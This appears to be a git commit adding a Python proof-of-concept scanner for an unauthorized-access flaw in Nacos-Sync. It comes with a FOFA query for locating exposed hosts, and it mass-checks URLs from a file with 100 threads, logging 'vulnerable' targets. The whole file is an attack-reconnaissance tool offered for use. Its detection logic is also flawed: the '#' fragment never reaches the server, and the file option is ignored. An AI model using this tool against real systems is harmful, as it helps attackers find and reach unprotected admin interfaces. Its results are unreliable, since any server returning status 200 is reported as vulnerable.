6a0ed0425425d41baad1d330936d3de39f21c0c1
zz1admin <2843950434@qq.com>
2024-07-22 13:57:19 +0800

    Add files via upload

---
+++ 7月19号1.py
@@ -0,0 +1,59 @@
+#Nacos-Sync未授权漏洞
+#fofa:title="Nacos-Sync"
+
+import requests,sys,argparse,json,re
+from multiprocessing.dummy import Pool
+# 关闭警告
+requests.packages.urllib3.disable_warnings()
+
+def banner():
+    test ="""
+███╗   ██╗ █████╗  ██████╗ ██████╗ ███████╗      ███████╗██╗   ██╗███╗   ██╗ ██████╗
+████╗  ██║██╔══██╗██╔════╝██╔═══██╗██╔════╝      ██╔════╝╚██╗ ██╔╝████╗  ██║██╔════╝
+██╔██╗ ██║███████║██║     ██║   ██║███████╗█████╗███████╗ ╚████╔╝ ██╔██╗ ██║██║     
+██║╚██╗██║██╔══██║██║     ██║   ██║╚════██║╚════╝╚════██║  ╚██╔╝  ██║╚██╗██║██║     
+██║ ╚████║██║  ██║╚██████╗╚██████╔╝███████║      ███████║   ██║   ██║ ╚████║╚██████╗
+╚═╝  ╚═══╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝      ╚══════╝   ╚═╝   ╚═╝  ╚═══╝ ╚═════╝
+                                                                                                                                                                                      
+"""
+    print(test)
+def main():
+    banner()
+    parse = argparse.ArgumentParser(description="")
+    parse.add_argument('-u','--url',dest='url',type=str,help="please input you url")
+    parse.add_argument('-f','--file',dest='file',type=str,help="please input you file")
+    args = parse.parse_args()
+    if args.url and not args.file:
+        poc(args.url)
+
+    elif args.file and not args.url:
+        url_list = []
+        with open('1.txt','r',encoding='utf-8') as fp:
+            for url in fp.readlines():
+                url_list.append(url.strip())
+        mp = Pool(100)
+        mp.map(poc,url_list)
+        mp.close()
+        mp.join()
+    else:
+        print(f"Usag:\n\t python3 {sys.argv[0]} -h") 
+
+def poc(target):
+    payload= "/#/serviceSync"
+    try:
+        res1 = requests.get(url=target+payload)
+        if res1.status_code==200:
+            print(f'[+]{target}存在漏洞')
+            with open('result.txt','a',encoding='utf-8') as fp1:
+                fp1.write(target+'\n')
+        else:
+            print(f'[-]{target}不存在漏洞')
+    except requests.RequestException as e:
+        print(f"[-] 请求失败: {target}, 错误信息: {e}")
+    except json.JSONDecodeError:
+        print(f"[-] 无法解码JSON响应: {target}")
+    except Exception as e:
+        print(f"[-] 处理请求时出错: {target}, 错误信息: {e}")   
+
+if __name__ == "__main__":
+    main()
